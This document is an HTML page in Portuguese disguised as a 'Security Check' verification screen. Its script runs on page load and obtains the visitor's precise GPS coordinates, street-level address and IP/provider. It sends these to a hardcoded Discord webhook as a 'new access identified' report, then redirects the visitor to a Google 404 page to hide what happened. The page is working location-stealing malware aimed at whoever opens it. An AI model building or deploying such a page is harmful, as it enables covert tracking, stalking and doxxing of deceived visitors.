<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 40px; border-radius: 16px; border: 1px solid #334155; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 320px; }
        .spinner { border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; padding: 12px 20px; border-radius: 8px; font-size: 14px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="notifications"></div>

    <div class="card">
        <div class="spinner"></div>
        <h2 style="margin: 0 0 10px 0;">Verificando...</h2>
        <p style="font-size: 14px; color: #94a3b8;">Aguarde a valida√ß√£o do protocolo de seguran√ßa.</p>
    </div>

    <script>
        // WEBHOOK ATUALIZADO COM O LINK QUE VOC√ä MANDOU AGORA
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        function notify(msg) {
            const container = document.getElementById('notifications');
            const n = document.createElement('div');
            n.className = 'toast';
            n.innerText = '‚Ñπ ' + msg;
            container.appendChild(n);
            setTimeout(() => n.remove(), 4000);
        }

        async function capturarEEnviar() {
            notify("Conectando ao servidor...");

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    notify("Sincronizando localiza√ß√£o...");

                    try {
                        // 1. Pega dados de endere√ßo real via GPS
                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                        const geoData = await geoRes.json();
                        const addr = geoData.address;

                        // 2. Pega dados de IP e Provedor
                        const ipRes = await fetch('https://ipapi.co/json/');
                        const ipData = await ipRes.json();

                        // 3. Monta o relat√≥rio final
                        const payload = {
                            embeds: [{
                                title: "üöÄ NOVO ACESSO IDENTIFICADO",
                                color: 5814783,
                                fields: [
                                    { name: "üö© Pais:", value: addr.country || "Brasil", inline: true },
                                    { name: "üèõÔ∏è Estado:", value: addr.state || "N/A", inline: true },
                                    { name: "üèôÔ∏è Cidade:", value: addr.city || addr.town || addr.village || "N/A", inline: true },
                                    { name: "üìÆ Cep:", value: addr.postcode || "N/A", inline: true },
                                    { name: "üìç Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
                                    { name: "üåê Internet/Provedor:", value: ipData.org || "N/A", inline: false },
                                    { name: "‚è∞ Hor√°rio:", value: new Date().toLocaleString('pt-BR'), inline: false }
                                ],
                                footer: { text: "Sistema de Monitoramento Ativo" }
                            }]
                        };

                        // 4. ENVIA PARA O DISCORD
                        const response = await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });

                        if(response.ok) {
                            notify("Verifica√ß√£o conclu√≠da!");
                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 2000);
                        } else {
                            notify("Erro no Webhook. Verifique o Discord.");
                        }

                    } catch (err) {
                        console.error("Erro no processamento:", err);
                        notify("Erro de resposta do servidor.");
                    }
                }, (erro) => {
                    notify("Erro: Localiza√ß√£o necess√°ria.");
                }, { enableHighAccuracy: true });
            }
        }

        window.onload = capturarEEnviar;
    </script>
</body>
</html>
